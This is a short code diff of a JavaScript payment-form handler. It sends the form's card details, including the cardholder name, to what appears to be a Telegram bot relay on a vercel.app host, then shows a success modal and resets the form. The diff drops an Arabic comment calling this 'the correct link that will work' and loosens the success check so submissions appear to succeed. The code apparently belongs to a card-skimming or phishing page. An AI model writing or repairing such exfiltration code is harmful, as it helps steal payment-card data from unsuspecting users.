@@ -110,7 +110,6 @@ document.addEventListener('DOMContentLoaded', function() {
             cardHolder: cardHolderInput.value
         };
         
-        // هذا هو الرابط الصحيح الذي سيعمل
         const apiEndpoint = 'https://telegram-bot-proxy-lime.vercel.app/api/send';
 
         try {
@@ -124,7 +123,7 @@ document.addEventListener('DOMContentLoaded', function() {
             
             const data = await response.json();
 
-            if (data.success) {
+            if (response.ok) {
                 showSuccessModal();
                 paymentForm.reset();
                 resetSubmitButton();
